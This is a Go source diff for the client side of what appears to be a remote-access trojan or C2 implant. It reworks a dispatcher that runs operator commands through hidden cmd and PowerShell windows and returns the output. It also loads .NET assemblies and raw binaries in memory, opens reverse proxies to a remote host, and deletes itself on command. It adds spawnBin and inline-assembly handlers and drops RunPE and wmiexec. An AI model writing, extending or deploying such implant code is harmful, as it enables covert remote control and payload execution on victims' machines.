@@ -4,6 +4,8 @@ import (
 	"bytes"
 	"fmt"
 	"io/ioutil"
+	"net"
+	"runtime"
 	"syscall"
 
 	"main/Encrypt"
@@ -13,7 +15,6 @@ import (
 	"main/MessagePack"
 	"main/PcInfo"
 	"main/TCPsocket"
-	"net"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -26,7 +27,7 @@ import (
 var ProcessPath string
 var FilePath string
 
-func SessionLog(log string, Connection net.Conn, unmsgpack MessagePack.MsgPack) {
+func SessionLog(log string, conn net.Conn, unmsgpack MessagePack.MsgPack) {
 	result := ""
 	result = string(log)
 	utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
@@ -41,7 +42,8 @@ func SessionLog(log string, Connection net.Conn, unmsgpack MessagePack.MsgPack) 
 	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
 	msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
 	msgpack.ForcePathObject("ReadInput").SetAsString(utf8Stdout)
-	TCPsocket.Send(Connection, msgpack.Encode2Bytes())
+	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
+	TCPsocket.Send(conn, msgpack.Encode2Bytes())
 
 }
 
@@ -58,7 +60,6 @@ func Read(Data []byte, Connection net.Conn) {
 
 	case "OSshell":
 		go func() {
-			fmt.Println(unmsgpack.ForcePathObject("Command").GetAsString())
 			cmd := exec.Command("cmd", "/c", unmsgpack.ForcePathObject("Command").GetAsString())
 			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			var stdout, stderr bytes.Buffer
@@ -73,12 +74,7 @@ func Read(Data []byte, Connection net.Conn) {
 				}
 			}
 
-			utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
-			if err != nil {
-				//Log(err.Error(), Connection, *unmsgpack)
-				utf8Stdout = err.Error()
-			}
-			SessionLog(utf8Stdout, Connection, *unmsgpack)
+			SessionLog(result, Connection, *unmsgpack)
 		}()
 	case "OSpowershell":
 		{
@@ -101,7 +97,6 @@ func Read(Data []byte, Connection net.Conn) {
 					utf8Stdout = err.Error()
 				}
 
-				// 记录执行结果
 				SessionLog(utf8Stdout, Connection, *unmsgpack)
 			}()
 		}
@@ -149,7 +144,6 @@ func Read(Data []byte, Connection net.Conn) {
 			msgpack.ForcePathObject("ProcessInfo").SetAsString(utf8Stdout)
 			TCPsocket.Send(Connection, msgpack.Encode2Bytes())
 		}
-
 	case "getPath":
 		{
 
@@ -367,7 +361,7 @@ func Read(Data []byte, Connection net.Conn) {
 			switch unmsgpack.ForcePathObject("Command").GetAsString() {
 			case "Disconnnect":
 				{
-					os.Exit(1)
+					os.Exit(0)
 				}
 			}
 		}
@@ -380,7 +374,7 @@ func Read(Data []byte, Connection net.Conn) {
 			}
 			//fmt.Println(exe)
 			os.Remove(exe)
-			os.Exit(1)
+			os.Exit(0)
 		}
 	case "ClientReboot":
 		{
@@ -446,9 +440,10 @@ func Read(Data []byte, Connection net.Conn) {
 
 				err := cmd.Run()
 				result := stdout.String()
-				if err != nil {
 
-					if result == "" {
+				if err != nil {
+					//log.Printf("Command execution error: %v, error output: %s\n", err, stderr.String())
+					if result == "" { // If there is no standard output, use error output
 						result = stderr.String()
 					}
 				}
@@ -472,53 +467,50 @@ func Read(Data []byte, Connection net.Conn) {
 			args := unmsgpack.ForcePathObject("args").GetAsString()
 			//fmt.Println(strings.ReplaceAll(args, unmsgpack.ForcePathObject("HWID").GetAsString(), ""))
 			go func() {
-				if PcInfo.IsDotNetFour {
-					Assembly(Nps_4, Connection, args, unmsgpack)
-				} else {
-					Assembly(Nps_2, Connection, args, unmsgpack)
-				}
+				Assembly(Nps_4, Connection, args, unmsgpack)
 			}()
 		}
 	case "inline-assembly":
 		{
-			data := unmsgpack.ForcePathObject("File").GetAsBytes()
+			data := unmsgpack.ForcePathObject("Bin").GetAsBytes()
 			args := unmsgpack.ForcePathObject("args").GetAsString()
+			go func() {
+				InlineAssembly(data, Connection, args, unmsgpack)
+			}()
+		}
+	case "execute-assembly":
+		{
+			data := unmsgpack.ForcePathObject("Bin").GetAsBytes()
+			args := unmsgpack.ForcePathObject("args").GetAsString()
+			//fmt.Println(args)
 			go func() {
 
 				Assembly(data, Connection, args, unmsgpack)
 
 			}()
 		}
-	case "execute-assembly":
+	case "spwanBin":
 		{
-			data := unmsgpack.ForcePathObject("File").GetAsBytes()
-			args := unmsgpack.ForcePathObject("args").GetAsString()
-			fmt.Println(args)
 			go func() {
-				if PcInfo.IsDotNetFour {
-					Assembly(data, Connection, args, unmsgpack)
+				var prog string
+				if runtime.GOARCH == "amd64" {
+					prog = unmsgpack.ForcePathObject("Process64").GetAsString()
 				} else {
-					Assembly(data, Connection, args, unmsgpack)
+					prog = unmsgpack.ForcePathObject("Process86").GetAsString()
 				}
+				fmt.Println(unmsgpack.ForcePathObject("args").GetAsString())
+				RunCreateProcessWithPipe(unmsgpack.ForcePathObject("Bin").GetAsBytes(), prog, unmsgpack.ForcePathObject("args").GetAsString(), Connection)
 			}()
 		}
-	case "RunPE":
-		{
-			go func() {
-				RunPE(*unmsgpack, Connection)
 
-			}()
-		}
 	case "ReverseProxy":
 		{
 			RemoteIp := unmsgpack.ForcePathObject("remoteIp").GetAsString()
 			connectPort := unmsgpack.ForcePathObject("connectPort").GetAsString()
 			go func() {
-
-				//fmt.Println(RemoteIp + ":" + connectPort)
 				operate.ProxyRemote(RemoteIp+":"+connectPort, false)
 			}()
-			//fmt.Println(unmsgpack.ForcePathObject("HPID").GetAsString())
+			fmt.Println(unmsgpack.ForcePathObject("HPID").GetAsString())
 			msgpack := new(MessagePack.MsgPack)
 
 			msgpack.ForcePathObject("Pac_ket").SetAsString("ProxyInfo")
@@ -559,18 +551,6 @@ func Read(Data []byte, Connection net.Conn) {
 			msgpack.ForcePathObject("Stream").SetAsBytes(data)
 			TCPsocket.Send(Connection, msgpack.Encode2Bytes())
 		}
-	case "wmiexec":
-		{
-			args := unmsgpack.ForcePathObject("ARGS").GetAsString()
-			fmt.Println(args)
-			go func() {
-				if PcInfo.IsDotNetFour {
-					Assembly(Nps_4, Connection, args, unmsgpack)
-				} else {
-					Assembly(Nps_2, Connection, args, unmsgpack)
-				}
-			}()
-		}
-	}
 
+	}
 }
